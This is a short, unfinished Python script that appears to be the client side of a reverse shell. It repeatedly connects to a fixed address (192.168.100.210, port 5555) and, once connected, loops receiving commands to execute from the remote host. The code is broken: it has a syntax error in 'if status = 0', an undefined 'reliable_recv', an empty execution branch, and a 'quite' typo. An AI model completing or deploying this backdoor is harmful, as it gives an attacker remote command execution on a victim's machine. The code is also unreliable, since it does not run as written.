import socket
import time

def connection():
    while True:
        time.sleep(20)
        try:
            status = s.connect_ex(('192.168.100.210', 5555))
            if status = 0:
                shell()
                s.close()
                break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == "quite":
            break
        else:
            #execute command

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()